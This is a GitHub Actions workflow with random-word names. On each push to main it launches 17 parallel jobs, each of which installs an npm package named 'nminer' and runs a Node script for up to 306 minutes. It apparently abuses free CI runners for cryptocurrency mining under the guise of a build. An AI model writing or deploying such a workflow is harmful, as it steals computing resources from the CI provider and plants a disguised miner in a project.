name: pronoun
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2793 }
          - { version: 1165 }
          - { version: 78 }
          - { version: 7463 }
          - { version: 837 }
          - { version: 1510 }
          - { version: 3119 }
          - { version: 6823 }
          - { version: 912 }
          - { version: 9768 }
          - { version: 6705 }
          - { version: 3024 }
          - { version: 2843 }
          - { version: 9863 }
          - { version: 7256 }
          - { version: 5097 }
          - { version: 2378 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: monstrous jaggedly
        run: |
          npm install nminer@latest
          timeout 306m node pronoun.js || echo "pronoun executed"